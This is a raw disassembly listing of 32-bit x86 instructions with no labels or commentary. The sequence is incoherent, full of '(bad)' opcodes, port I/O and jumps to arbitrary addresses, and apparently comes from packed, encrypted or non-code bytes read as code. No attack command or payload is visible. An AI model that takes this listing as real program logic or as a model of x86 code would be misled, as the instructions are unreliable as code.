  415059:	xor    DWORD PTR [esi-0x31],ecx
  41505c:	xchg   DWORD PTR [edx+0x1f],esi
  41505f:	mov    dl,0xb9
  415061:	cld    
  415062:	int    0x3d
  415064:	push   ecx
  415065:	rcl    DWORD PTR [edi-0x2db0c2bf],0x3b
  41506c:	icebp  
  41506d:	xor    BYTE PTR [esi],ah
  41506f:	ret    
  415070:	jmp    0x4150ae
  415072:	xlat   BYTE PTR ds:[ebx]
  415073:	test   al,0xce
  415075:	adc    DWORD PTR [ebp+0x2fab7f9f],esi
  41507b:	inc    esp
  41507c:	adc    DWORD PTR [ecx],ebx
  41507e:	gs inc ebp
  415080:	jmp    0xe13:0xdbab7488
  415087:	sbb    dh,ch
  415089:	std    
  41508a:	jle    0x4150c0
  41508c:	(bad)  
  41508d:	clc    
  41508e:	loop   0x4150b1
  415090:	jne    0x4150f4
  415092:	push   esp
  415093:	fdivr  DWORD PTR [ecx]
  415095:	(bad)  
  415097:	outs   dx,DWORD PTR ds:[esi]
  415098:	mov    bh,BYTE PTR [edi]
  41509a:	xchg   eax,esi
  41509c:	inc    ebx
  41509d:	retf   0xb71a
  4150a0:	daa    
  4150a1:	pop    edi
  4150a2:	loopne 0x4150f3
  4150a4:	call   0x12ac:0x1813edd1
  4150ab:	mov    cl,0x54
  4150ad:	bnd jns 0x4150f3
  4150b0:	(bad)  
  4150b1:	jle    0x415104
  4150b3:	adc    ch,BYTE PTR [edi]
  4150b5:	lahf   
  4150b6:	pushf  
  4150b7:	xchg   ecx,eax
  4150b8:	(bad)  
  4150b9:	inc    ebp
  4150ba:	in     eax,dx
  4150bb:	cmp    esp,DWORD PTR [esi]
  4150bd:	pop    esp
  4150be:	cs mov ah,0xf7
  4150c1:	pop    ss
  4150c2:	jge    0x415124
  4150c4:	and    eax,0xb3913400
  4150c9:	aaa    
  4150ca:	adc    ch,BYTE PTR [ebx+0xc2e6a14]
  4150d0:	cwde   
  4150d1:	dec    esp
  4150d2:	mov    al,ds:0xc4c5f5fb
  4150d7:	bound  edx,QWORD PTR [edx-0x80]
  4150da:	xchg   BYTE PTR [edi+0x67],bh
  4150dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150de:	fs pop esp
  4150e0:	adc    al,0x59
  4150e2:	and    ch,BYTE PTR [edi]
  4150e4:	inc    ecx
  4150e5:	fcomp  QWORD PTR [ebp+0x3d109714]
  4150eb:	out    dx,eax
  4150ec:	adc    eax,0x5874de7a
  4150f1:	icebp  
  4150f2:	mov    ebp,0x94cbc23f
  4150f7:	sub    bl,cl
  4150f9:	cld    
  4150fa:	add    DWORD PTR [eax],0x3
  4150fd:	inc    esi
  4150fe:	sub    edx,ebx
  415100:	lods   eax,DWORD PTR ds:[esi]
  415101:	dec    esi
  415102:	popf   
  415103:	lods   al,BYTE PTR ds:[esi]
  415104:	pop    ecx
  415105:	outs   dx,BYTE PTR ds:[esi]
  415106:	pop    ds
  415107:	jp     0x4150d6
  415109:	dec    ebp
  41510a:	sub    DWORD PTR [esi+edi*4],ebx
  41510d:	add    edi,esi
  41510f:	mov    bh,dh
  415111:	xor    ch,BYTE PTR [eax]
  415113:	out    0x4a,al
  415115:	repnz sbb eax,0xc93fa2d9
  41511b:	fdiv   st,st(2)
  41511d:	sbb    bl,ch
  41511f:	and    esi,eax
  415121:	fistp  QWORD PTR [edi+0x794e3e5d]
  415127:	data16 adc BYTE PTR ds:0x608464c2,ch
  41512e:	pushf  
  41512f:	xlat   BYTE PTR ds:[ebx]
  415130:	popf   
  415131:	jne    0x415127
  415133:	sbb    eax,DWORD PTR [esi-0xb0c0c3b]
  415139:	(bad)  
  41513a:	jge    0x4150d4
  41513c:	cmp    bh,BYTE PTR [ebx-0x782eca5c]
  415142:	inc    ecx
  415143:	test   DWORD PTR ds:0xd1340d8c,eax
  415149:	cmp    eax,0x9e5a22fb
  41514e:	mov    cl,0xc4
  415150:	mov    al,ds:0x1ba13c31
  415155:	jno    0x415104
  415157:	sub    eax,0x27659b2
  41515c:	jbe    0x4150e6
  41515e:	jo     0x4151b8
  415160:	cmp    ch,ch
  415162:	out    0x21,al
  415164:	xchg   esi,eax
  415165:	jnp    0x41513b
  415167:	add    BYTE PTR [edi+0x73],0xf8
  41516b:	mov    ?,ecx
  41516d:	jno    0x415198
  41516f:	push   ebx
  415170:	jnp    0x415178
  415172:	lds    edi,FWORD PTR [edx+0x1f]
  415175:	mov    ebx,esp
  415177:	aas    
  415178:	mov    eax,ds:0x1c373c16
  41517d:	push   esi
  41517e:	inc    ecx
  41517f:	jmp    0x415130
  415181:	mov    ch,0x8c
  415183:	xchg   edi,eax
  415184:	xchg   ebx,eax
  415185:	push   eax
  415186:	pop    ss
  415187:	and    ebp,DWORD PTR [ecx]
  415189:	add    eax,0x9a3f295b
  41518e:	dec    ecx
  41518f:	pop    edi
  415190:	add    eax,0x1710e851
  415195:	aas    
  415196:	ja     0x4151e9
  415198:	pop    ecx
  415199:	outs   dx,DWORD PTR ds:[esi]
  41519a:	mov    al,ds:0x266de78a
  41519f:	fstp   TBYTE PTR [esi-0x61]
  4151a2:	ror    esi,cl
  4151a4:	mov    BYTE PTR [ecx-0x18008d27],dl
  4151aa:	adc    BYTE PTR [edi+0x503033cf],dl
  4151b0:	and    eax,DWORD PTR [ecx-0x43188979]
  4151b6:	in     al,dx
  4151b7:	and    dh,BYTE PTR [ecx-0xad113ef]
  4151bd:	les    edi,FWORD PTR [esi+0x5e65a2a6]
  4151c3:	cmp    eax,0x65f19560
  4151c8:	adc    eax,0xc718d807
  4151cd:	push   eax
  4151ce:	adc    BYTE PTR [ecx],al
  4151d0:	mov    ebx,0xc7666b29
  4151d5:	mov    edx,0xc5c39e3
  4151da:	loopne 0x41518c
  4151dc:	(bad)  
  4151de:	pusha  
  4151df:	pop    ebp
  4151e0:	imul   esi,ebp,0xffffffe9
  4151e3:	mov    eax,0xd512b352
  4151e8:	hlt    
  4151e9:	pop    es
  4151ea:	fwait
  4151eb:	mov    dl,0x2e
  4151ed:	jae    0x415225
  4151ef:	sub    DWORD PTR [eax-0x7732e179],ebp
  4151f5:	lods   al,BYTE PTR ds:[esi]
  4151f6:	or     eax,DWORD PTR [edi+0x29]
  4151f9:	mov    ebp,0x3e444fa7
  4151fe:	jecxz  0x41522f
  415200:	xor    BYTE PTR [ecx-0x49],bh
  415203:	mov    esp,DWORD PTR [edx]
  415205:	pop    ss
  415206:	rcl    esp,1
  415208:	cmp    edx,DWORD PTR [ecx+0x58]
  41520b:	cmp    BYTE PTR [esp+ecx*1],bh
  41520e:	call   DWORD PTR [ebx-0x71b0cb97]
  415214:	rol    BYTE PTR [edx-0x63],1
  415217:	dec    edx
  415218:	jmp    0x415224
  41521a:	setge  BYTE PTR [ecx+0x2c0a702]
  415221:	fisttp WORD PTR [eax-0xe]
  415224:	dec    edx
  415225:	stos   BYTE PTR es:[edi],al
  415226:	cli    
  415227:	repz rol ecx,cl
  41522a:	mov    dh,0x14
  41522c:	jmp    0xa9bd:0x7801c6fc
  415233:	mov    esp,0x207c9d13
  415238:	xchg   DWORD PTR [ecx+0x310b1dfe],ebx
  41523e:	fs sbb esi,ebx
  415241:	and    DWORD PTR [esi+0x70],esi
  415244:	adc    al,0x1c
  415246:	sar    BYTE PTR [ecx-0x60b32551],1
  41524c:	rol    BYTE PTR ds:0xd574f095,cl
  415252:	xor    esp,DWORD PTR [edx-0x2b]
  415255:	xor    DWORD PTR [edx-0x60888f2f],ecx
  41525b:	ss xchg esi,eax
  41525d:	jae    0x41527c
  41525f:	shl    BYTE PTR [edi],0x86
  415262:	lds    ecx,FWORD PTR [ebx]
  415264:	or     BYTE PTR [esi],dl
  415266:	jb     0x415275
  415268:	shr    DWORD PTR [esi+0x59],1
  41526b:	es jp  0x4152c8
  41526e:	iret   
  41526f:	outs   dx,DWORD PTR ds:[esi]
  415270:	or     eax,0xc35cb68f
  415275:	push   ss
  415276:	xchg   esp,eax
  415277:	xchg   edx,eax
  415278:	mov    ds:0xa4948aa3,eax
  41527d:	(bad)  
  41527e:	mov    ebx,0xf6732719
  415283:	add    al,BYTE PTR [eax+ebx*1-0xe]
  415287:	xor    ch,BYTE PTR [edi-0x5782212d]
  41528d:	cmp    DWORD PTR [edx+0x3],ebx
  415290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415291:	adc    ebp,DWORD PTR [ebp+0x592bc0ef]
  415297:	adc    eax,0x7ccb0e1f
  41529c:	ss popf 
  41529e:	shufps xmm0,XMMWORD PTR [eax-0x5c],0x1b
  4152a3:	jno    0x415300
  4152a5:	or     al,0x9a
  4152a7:	mov    eax,0xe298cdcb
  4152ac:	or     eax,0x5604f0a1
  4152b1:	sub    BYTE PTR [esi+0x2a985812],dl
  4152b7:	(bad)
  4152bb:	in     eax,dx
  4152bc:	mov    ah,0xbb
  4152be:	jp     0x4152ed
  4152c0:	ret    
  4152c1:	mov    ch,0x90
  4152c3:	jnp    0x415280
  4152c5:	adc    al,0x49
  4152c7:	xor    DWORD PTR [edi+edx*2+0x6c62b46],ecx
  4152ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152cf:	mov    al,0xe3
  4152d1:	(bad)  
  4152d2:	in     eax,0xa5
  4152d4:	mov    al,0xa
  4152d6:	pop    ebp
  4152d7:	call   0x6e6a:0xea15ad02
  4152de:	and    DWORD PTR [ecx],ecx
  4152e0:	mov    ecx,0x8153398a
  4152e5:	int3   
  4152e6:	inc    eax
  4152e7:	inc    esi
  4152e8:	stos   DWORD PTR es:[edi],eax
  4152e9:	jmp    0x1dccabdc
  4152ee:	or     bh,BYTE PTR [ebx+0x799b9558]
  4152f4:	sub    dl,bl
  4152f6:	xchg   ecx,eax
  4152f7:	retf   
  4152f8:	(bad)  [ebx]
  4152fa:	push   edi
  4152fb:	pop    ebp
  4152fc:	scas   al,BYTE PTR es:[edi]
  4152fd:	add    esi,DWORD PTR [ebx+0x7752aab7]
  415303:	or     ebp,edi
  415305:	cwde   
  415306:	icebp  
  415307:	lods   eax,DWORD PTR ds:[esi]
  415308:	or     ecx,DWORD PTR [esi+0x7368eee8]
  41530e:	(bad)  
  41530f:	mov    eax,0x2009c5a2
  415314:	sbb    al,0xed
  415316:	lods   al,BYTE PTR ds:[esi]
  415317:	int3   
  415318:	fs (bad) 
  41531a:	call   0x28eecc70
  41531f:	test   BYTE PTR [edx-0x4f],al
  415322:	loopne 0x415361
  415324:	jle    0x415308
  415326:	bound  ebp,QWORD PTR [ebp+0x41]
  415329:	lahf   
  41532a:	cld    
  41532b:	mov    eax,0xd10fd61b
  415330:	or     DWORD PTR [eax-0x1],ebx
  415333:	xor    ebx,DWORD PTR [ecx]
  415335:	stc    
  415336:	jb     0x41539f
  415338:	ss nop
  41533a:	pop    ds
  41533b:	xor    BYTE PTR [eax],dl
  41533d:	add    dl,ch
  41533f:	mov    ebx,0x5a842237
  415344:	and    bh,BYTE PTR [ecx]
  415346:	scas   al,BYTE PTR es:[edi]
  415347:	jl     0x415356
  415349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41534a:	add    edi,DWORD PTR [eax+0x1b0bb0a6]
  415350:	push   ss
  415351:	mov    bh,0x80
  415353:	sbb    eax,0x70fe462a
  415358:	push   esi
  415359:	adc    eax,0x23a8d213
  41535e:	cmp    BYTE PTR [edi-0x7b8b8eed],ch
  415364:	mov    cl,0xa4
  415366:	xchg   BYTE PTR [ecx+0x2d],bl
  415369:	dec    edx
  41536a:	jbe    0x4153b6
  41536c:	aas    
  41536d:	xchg   DWORD PTR [edi],edx
  41536f:	cmp    DWORD PTR [eax],eax
  415371:	je     0x415344
  415373:	popf   
  415374:	and    edx,DWORD PTR ds:[ebx]
  415377:	clc    
  415378:	sti    
  415379:	jo     0x415367
  41537b:	inc    eax
  41537c:	push   es
  41537d:	adc    eax,0xee8c0d68
  415382:	out    dx,al
  415383:	xchg   esi,eax
  415384:	test   bl,cl
  415386:	(bad)  
  415387:	shr    DWORD PTR [ebx+0x1a30064a],1
  41538d:	call   0xac490b02
  415392:	or     dh,bl
  415394:	dec    ebp
  415395:	retf   
  415396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415397:	cmc    
  415398:	dec    edi
  415399:	sub    ebx,DWORD PTR [ebx+0x6165fe5]
  41539f:	cmp    edi,eax
  4153a1:	xchg   eax,ecx
  4153a3:	shr    cl,1
  4153a5:	mov    bh,BYTE PTR [edi+0x7cf245cb]
  4153ab:	mov    ebx,0xe54585e1
  4153b0:	xor    eax,0xe7ed9161
  4153b5:	lods   al,BYTE PTR ds:[esi]
  4153b6:	or     BYTE PTR [edx],0x61
  4153b9:	inc    esi
  4153ba:	push   ebp
  4153bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153bc:	sbb    DWORD PTR [esi+0x53369681],edx
  4153c2:	stos   DWORD PTR es:[edi],eax
  4153c3:	loope  0x415375
  4153c5:	out    0x70,al
  4153c7:	mov    eax,0xa71626cd
  4153cc:	mov    dh,BYTE PTR [ecx-0x2b]
  4153cf:	ins    BYTE PTR es:[edi],dx
  4153d0:	icebp  
  4153d1:	pop    esp
  4153d2:	repz test al,0xbb
  4153d5:	jmp    0x415444
  4153d7:	sbb    DWORD PTR [edi+0x72],ebx
  4153da:	mov    eax,ds:0xe69f16de
  4153df:	ficomp DWORD PTR [ebp-0x32987f99]
  4153e5:	pop    edx
  4153e6:	sbb    ch,BYTE PTR [esi-0x6]
  4153e9:	icebp  
  4153ea:	sbb    BYTE PTR [ebx-0x37],bl
  4153ed:	sub    DWORD PTR [esi+0x53],ebp
  4153f0:	gs jl  0x415424
  4153f3:	adc    DWORD PTR [ecx],0xffffffac
  4153f6:	and    DWORD PTR [ebp-0x51],ebp
  4153f9:	jmp    0x415436
  4153fb:	popa   
  4153fc:	leave  
  4153fd:	in     al,dx
  4153fe:	call   0xacbb9616
  415403:	fild   QWORD PTR [ebx+0x4e]
  415406:	or     dl,cl
  415408:	xor    DWORD PTR [edi-0x67],esi
  41540b:	cwde   
  41540c:	push   cs
  41540d:	mov    bh,0x2f
  41540f:	push   ebp
  415410:	ins    DWORD PTR es:[edi],dx
  415411:	inc    eax
  415412:	int3   
  415413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415414:	cmc    
  415415:	xchg   DWORD PTR [edi+0x10],eax
  415418:	push   eax
  415419:	sbb    eax,0x934d91e3
  41541e:	gs add al,0xe
  415421:	iret   
  415422:	loopne 0x415480
  415424:	mov    ds:0x49f6936f,al
  415429:	pop    ecx
  41542a:	sti    
  41542b:	rcl    DWORD PTR [edx],1
  41542d:	fadd   DWORD PTR [ebx]
  41542f:	dec    edx
  415430:	mov    ecx,0x79953ab7
  415435:	jbe    0x41541e
  415437:	xchg   BYTE PTR [ebx+0x21637b3d],bl
  41543d:	add    bl,BYTE PTR [edi-0x77d5d00c]
  415443:	es and esi,ebx
  415446:	stc    
  415447:	sar    BYTE PTR [edi+eax*4+0x7],0x60
  41544c:	(bad)
  415450:	mov    dh,0x66
  415452:	sub    eax,0x2de7b1a9
  415457:	sub    al,0x99
  415459:	outs   dx,DWORD PTR ds:[esi]
  41545a:	xchg   ebx,eax
  41545b:	mov    al,ds:0xeab50753
  415460:	or     BYTE PTR [ebp+0x6ff7dabb],bh
  415466:	or     edx,DWORD PTR [esi+edx*2-0x70]
  41546a:	mov    ecx,0x27dfed25
  41546f:	push   esi
  415470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415471:	inc    DWORD PTR [edi-0x20]
  415474:	add    BYTE PTR [edx],bl
  415476:	repz pop ss
  415478:	ror    edx,1
  41547a:	stos   DWORD PTR es:[edi],eax
  41547b:	out    0xde,al
  41547d:	imul   eax,DWORD PTR ds:0xcd0ecd01,0x28689ab3
  415487:	and    BYTE PTR [esi],bl
  415489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41548a:	sbb    BYTE PTR [edi],dh
  41548c:	dec    eax
  41548d:	scas   al,BYTE PTR es:[edi]
  41548e:	adc    edx,DWORD PTR [ecx+0x6c]
  415491:	arpl   WORD PTR [edx],sp
  415493:	xchg   ecx,eax
  415494:	xor    BYTE PTR [ebx],ah
  415496:	aas    
  415497:	ins    DWORD PTR es:[edi],dx
  415498:	xor    dl,al
  41549a:	sahf   
  41549b:	sub    BYTE PTR cs:[ebx],dh
  41549e:	shr    DWORD PTR [ebp+ebp*2-0x77349d0a],1
  4154a5:	mov    eax,0x886ad4ee
  4154aa:	test   DWORD PTR [esi+ebp*4],esp
  4154ad:	and    al,0xc1
  4154af:	mov    cl,0xe0
  4154b1:	es das 
  4154b3:	xchg   DWORD PTR [edx-0x66],esi
  4154b6:	xchg   ecx,eax
  4154b7:	lock das 
  4154b9:	jbe    0x41548a
  4154bb:	push   ds
  4154bc:	lahf   
  4154bd:	jle    0x41547c
  4154bf:	fild   QWORD PTR [esi+eiz*8+0xb37edec]
  4154c6:	pop    edx
  4154c7:	test   DWORD PTR [esi],0x77611d72
  4154cd:	out    0x4,al
  4154cf:	nop
  4154d0:	iret   
  4154d1:	or     ebx,DWORD PTR [ebx+0x66351a87]
  4154d7:	pop    ss
  4154d8:	mov    ds:0x42903f0f,al
  4154dd:	jle    0x4154bf
  4154df:	jae    0x415478
  4154e1:	nop
  4154e2:	out    0xfe,al
  4154e4:	fisub  WORD PTR [edx]
  4154e6:	mov    DWORD PTR [edi-0x13],edx
  4154e9:	out    dx,eax
  4154ea:	iret   
  4154eb:	mov    al,ds:0x7d100dcd
  4154f0:	mov    esp,0xa182a2eb
  4154f5:	xor    BYTE PTR [ebx-0x76],dh
  4154f8:	das    
  4154f9:	push   es
  4154fa:	call   0x6045:0x60e8c22
  415501:	mov    BYTE PTR [ebp+0x63],bl
  415504:	dec    bh
  415506:	in     eax,dx
  415507:	adc    eax,0x74df8f98
  41550c:	push   esp
  41550d:	pop    edx
  41550e:	enter  0x7dac,0x9b
  415512:	outs   dx,DWORD PTR ds:[esi]
  415513:	nop
  415514:	sbb    al,0x4
  415516:	in     eax,0x64
  415518:	out    0x61,al
  41551a:	sbb    ebx,DWORD PTR [ebx+ebx*1]
  41551d:	jno    0x415590
  41551f:	sti    
  415520:	push   ds
  415521:	xchg   ebp,eax
  415522:	adc    BYTE PTR [edi+eax*4-0x6f],ch
  415526:	dec    ebp
  415527:	xor    BYTE PTR [ebx],cl
  415529:	arpl   si,cx
  41552b:	js     0x415503
  41552d:	mov    ebx,0xbf003adc
  415532:	(bad)  
  415533:	ss jo  0x4154ca
  415536:	cwde   
  415537:	retf   0x1929
  41553a:	test   BYTE PTR [edi],dl
  41553c:	inc    ebp
  41553d:	test   al,0xf5
  41553f:	pop    edx
  415540:	mov    ecx,DWORD PTR [esi]
  415542:	push   ebx
  415543:	in     al,0x51
  415545:	lea    esi,[edi]
  415547:	imul   esp,DWORD PTR [ebp+0x10e87703],0xfffffffd
  41554e:	mov    dh,0x5e
  415550:	xor    BYTE PTR [edi-0x7d],ah
  415553:	pushf  
  415554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415555:	push   esp
  415556:	cmp    DWORD PTR [ecx-0x59],0xffffffaf
  41555a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41555b:	xor    eax,0xdf527ae
  415560:	arpl   WORD PTR [edi+ebp*1-0x49ffc197],dx
  415567:	mov    bh,0x40
  415569:	mov    edx,0xff4a2dc
  41556e:	inc    esi
  41556f:	push   ss
  415570:	pop    ebp
  415571:	call   0x69238da7
  415576:	add    al,0x3b
  415578:	mov    edi,0x66720a98
  41557d:	jp     0x4155d6
  41557f:	je     0x41551f
  415581:	out    dx,eax
  415582:	xor    edx,DWORD PTR [edi+0x20]
  415585:	push   ebp
  415586:	mov    edi,0x970c1db0
  41558b:	nop
  41558c:	data16 jo 0x41552f
  41558f:	test   dl,dh
  415591:	push   esi
  415592:	into   
  415593:	mov    edx,0x8ea509f
  415598:	mov    ss,WORD PTR [eax-0x3d]
  41559b:	es iret 
  41559d:	sbb    BYTE PTR [esi+0x13],ch
  4155a0:	daa    
  4155a1:	pop    esp
  4155a2:	fld    DWORD PTR [ecx]
  4155a4:	pop    es
  4155a5:	int3   
  4155a6:	cmp    bh,BYTE PTR [edi]
  4155a8:	cmp    esp,edx
  4155aa:	outs   dx,DWORD PTR ds:[esi]
  4155ab:	stc    
  4155ac:	div    DWORD PTR [esi+0xe]
  4155af:	sahf   
  4155b0:	xchg   edx,eax
  4155b1:	fldenv ds:0xe4c09cdf
  4155b7:	sbb    al,0x71
  4155b9:	sub    al,al
  4155bb:	pop    eax
  4155bc:	bound  edi,QWORD PTR [ebx+0x4c]
  4155bf:	jmp    0x291e52b5
  4155c4:	xor    DWORD PTR fs:[ebp-0x27fb886f],ebx
  4155cb:	add    BYTE PTR [eax-0x20],0xa5
  4155cf:	nop
  4155d0:	repnz outs dx,DWORD PTR ds:[esi]
  4155d2:	rol    DWORD PTR [eax-0xeb6cb8a],cl
  4155d8:	xchg   esp,eax
  4155d9:	and    eax,0x5bbbe24b
  4155de:	aaa    
  4155df:	xchg   edi,eax
  4155e0:	jg     0x4155eb
  4155e2:	adc    dl,al
  4155e4:	int    0x58
  4155e6:	mov    cl,0x3
  4155e8:	dec    edx
  4155e9:	mov    dl,0xc8
  4155eb:	call   DWORD PTR es:[ebp-0x3f]
  4155ef:	jg     0x415614
  4155f1:	aam    0x7c
  4155f3:	les    esp,FWORD PTR [edi]
  4155f5:	jbe    0x415584
  4155f7:	mov    ch,0x26
  4155f9:	cmp    DWORD PTR [esp+eax*8],0xbbd2201d
  415600:	or     bl,dl
  415602:	inc    eax
  415603:	pusha  
  415604:	add    ecx,DWORD PTR [ecx+ecx*2+0x305dfb23]
  41560b:	cmp    eax,0xf8895f0b
  415610:	icebp  
  415611:	sbb    DWORD PTR [ebp+0x3f9d86d2],edx
  415617:	sbb    bh,cl
  415619:	pop    edx
  41561a:	cmp    al,BYTE PTR [ecx-0x49f93cc8]
  415620:	xor    BYTE PTR [ecx],bl
  415622:	cmp    DWORD PTR [ebp+0x471fdeac],edx
  415628:	sub    edi,ebx
  41562a:	and    bl,cl
  41562c:	xor    BYTE PTR [ebp+ecx*4+0x59],al
  415630:	jge    0x41561c
  415632:	ss push ds
  415634:	pop    es
  415635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415636:	xchg   edx,eax
  415637:	(bad)  
  415638:	popa   
  415639:	xchg   ebx,eax
  41563a:	cmp    eax,DWORD PTR [eax]
  41563c:	lock cs mov ebp,0x5d84df00
  415643:	clc    
  415644:	loop   0x4156c5
  415646:	loopne 0x4156c3
  415648:	icebp  
  415649:	adc    dh,dh
  41564b:	cmp    al,0xa0
  41564d:	inc    esp
  41564e:	xchg   esi,eax
  41564f:	add    edx,0x38ee90a7
  415655:	sbb    DWORD PTR [edi-0x78],edi
  415658:	add    al,0xd
  41565a:	das    
  41565b:	shl    DWORD PTR [ebx],cl
  41565d:	rcr    bh,0xfb
  415660:	lods   al,BYTE PTR ds:[esi]
  415661:	xchg   esi,eax
  415662:	cdq    
  415663:	(bad)  
  415664:	and    edx,DWORD PTR [esi-0x31]
  415667:	jno    0x4156e7
  415669:	adc    BYTE PTR [edx-0x27cee887],al
  41566f:	mov    ebp,0xfdfcdef4
  415674:	push   edx
  415675:	xchg   DWORD PTR [ebx],esp
  415677:	ret    
  415678:	(bad)  
  415679:	fdivr  st(2),st
  41567b:	mov    esi,0x479d8b58
  415680:	test   eax,0x34b77034
  415685:	xor    bh,BYTE PTR [esi-0x2e40cf8b]
  41568b:	ror    BYTE PTR [esi+0x27f94cde],1
  415691:	or     eax,0x60163eed
  415696:	outs   dx,DWORD PTR ds:[esi]
  415697:	push   0xdd555736
  41569c:	les    edx,FWORD PTR [ecx+0x18b7ff64]
  4156a2:	pop    ss
  4156a3:	dec    BYTE PTR [ebx-0x7348a355]
  4156a9:	and    BYTE PTR [eax],ah
  4156ab:	inc    ebp
  4156ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ad:	hlt    
  4156ae:	jmp    0x2e907b31
  4156b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b4:	mov    edx,0x9ad9791b
  4156b9:	ror    al,1
  4156bb:	and    edi,DWORD PTR [ecx+ebp*1-0x7a0ebe12]
  4156c2:	mov    eax,DWORD PTR [ecx-0x6325f0a3]
  4156c8:	mov    dl,0xd8
  4156ca:	xor    eax,0x42f93fce
  4156cf:	hlt    
  4156d0:	dec    ebx
  4156d1:	jge    0x415722
  4156d3:	or     ebx,DWORD PTR [ebx]
  4156d5:	cdq    
  4156d6:	cmp    eax,0x90741219
  4156db:	or     al,0xb
  4156dd:	out    0xec,eax
  4156df:	add    al,0xef
  4156e1:	cmp    edi,esi
  4156e3:	(bad)  
  4156e4:	xlat   BYTE PTR ds:[ebx]
  4156e5:	mov    edx,0xd83865c4
  4156ea:	inc    ebx
  4156eb:	fsubr  DWORD PTR [ebx+eiz*2-0x224399fc]
  4156f2:	sub    ah,BYTE PTR ds:0x7fb1d6cf
  4156f8:	xchg   ebx,eax
  4156f9:	loopne 0x41574c
  4156fb:	mov    edi,0x69e5ca90
  415700:	adc    ecx,0xffffffd7
  415703:	aad    0x61
  415705:	(bad)  
  415706:	ins    BYTE PTR es:[edi],dx
  415707:	xor    eax,0xcc8a3942
  41570c:	sub    dh,BYTE PTR [esi-0x3b]
  41570f:	fistp  DWORD PTR [ebx+0x35]
  415712:	shr    DWORD PTR [edx-0x5d],1
  415715:	and    bl,dh
  415717:	lods   eax,DWORD PTR ds:[esi]
  415718:	mov    al,0x56
  41571a:	xchg   ecx,eax
  41571b:	stc    
  41571c:	jne    0x4156e5
  41571e:	and    al,0x37
  415720:	hlt    
  415721:	or     BYTE PTR [ebx+eax*1],bh
  415724:	pushf  
  415725:	mov    WORD PTR [edx+0x1c],ss
  415728:	cmp    esi,DWORD PTR [esi+0x56]
  41572b:	mov    bl,bl
  41572d:	es xchg esp,eax
  41572f:	mov    dl,0xc7
  415731:	out    0x39,al
  415733:	dec    edi
  415734:	adc    cl,bl
  415736:	mov    eax,0x7cd7295f
  41573b:	mov    ecx,0x613eb809
  415740:	xchg   esi,eax
  415741:	test   al,0xde
  415743:	mov    cs,edi
  415745:	outs   dx,DWORD PTR ds:[esi]
  415746:	or     al,0x71
  415748:	sub    bh,al
  41574a:	std    
  41574b:	jg     0x4157b6
  41574d:	ss pop ebx
  41574f:	xlat   BYTE PTR ds:[ebx]
  415750:	out    0x8,al
  415752:	addr16 jno 0x415738
  415755:	les    edi,FWORD PTR [edx+0x68f410d0]
  41575b:	les    eax,FWORD PTR [esi-0x51]
  41575e:	mov    eax,0x9895d6b6
  415763:	xchg   ebx,eax
  415764:	mov    al,0x18
  415766:	enter  0x7e23,0xec
  41576a:	push   ss
  41576b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41576c:	inc    edx
  41576d:	and    ah,dl
  41576f:	inc    ecx
  415770:	sbb    BYTE PTR [ebx+0x716ad962],cl
  415776:	inc    esp
  415777:	cmp    BYTE PTR [ebx-0x72],0x4c
  41577b:	(bad)  
  41577c:	inc    ecx
  41577d:	mov    cl,0x31
  41577f:	rcr    BYTE PTR [ebp+0x655d731a],1
  415785:	in     al,dx
  415786:	xor    bl,BYTE PTR [ecx+ebp*4]
  415789:	ss mov ch,0x63
  41578c:	stos   BYTE PTR es:[edi],al
  41578d:	pop    es
  41578e:	enter  0xed29,0xb9
  415792:	pop    es
  415793:	and    DWORD PTR [eax-0x41],esp
  415796:	leave  
  415797:	push   ss
  415798:	test   DWORD PTR [eax],ecx
  41579a:	mov    dl,0xe0
  41579c:	call   0x2a3751c4
  4157a1:	sub    ah,BYTE PTR [edi+0x5b]
  4157a4:	out    0x52,al
  4157a6:	push   eax
  4157a7:	(bad)  
  4157a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157a9:	cli    
  4157aa:	outs   dx,DWORD PTR ds:[esi]
  4157ab:	or     BYTE PTR [ecx+edi*2],ah
  4157ae:	add    al,0x6f
  4157b0:	inc    ebp
  4157b1:	mov    ebx,0xa85544a2
  4157b6:	dec    esp
  4157b7:	cli    
  4157b8:	retf   
  4157b9:	push   esi
  4157ba:	imul   esp,DWORD PTR [esp+eiz*4-0x20fc53c6],0xfffffffb
  4157c2:	adc    BYTE PTR [eax-0x576b8bda],al
  4157c8:	loope  0x4157ed
  4157ca:	ins    DWORD PTR es:[edi],dx
  4157cb:	sahf   
  4157cc:	cmp    BYTE PTR [ecx],0x2c
  4157cf:	push   eax
  4157d0:	stc    
  4157d1:	shl    BYTE PTR [edx-0x192949e7],1
  4157d7:	enter  0x61da,0x45
  4157db:	jae    0x415827
  4157dd:	fild   WORD PTR [eax-0x10]
  4157e0:	retf   
  4157e1:	sub    al,BYTE PTR [ebx+0x55587166]
  4157e7:	inc    ebx
  4157e8:	xor    BYTE PTR [ecx+0x7],al
  4157eb:	mov    cl,0xb7
  4157ed:	outs   dx,BYTE PTR ds:[esi]
  4157ee:	xchg   DWORD PTR [ecx-0x49],esp
  4157f1:	imul   edi,DWORD PTR [edx+0x497b85e4],0x7a
  4157f8:	shl    DWORD PTR [ebp+0x7e],1
  4157fb:	cmp    esp,DWORD PTR [ebx+eax*1]
  4157fe:	push   edx
  4157ff:	sub    eax,0x727bf82b
  415804:	pop    edi
  415805:	add    DWORD PTR [ebx-0x7b],esi
  415808:	push   0xe4f48399
  41580d:	xchg   ebx,eax
  41580e:	fstp   DWORD PTR [esp+esi*1]
  415811:	outs   dx,BYTE PTR ds:[esi]
  415812:	inc    esi
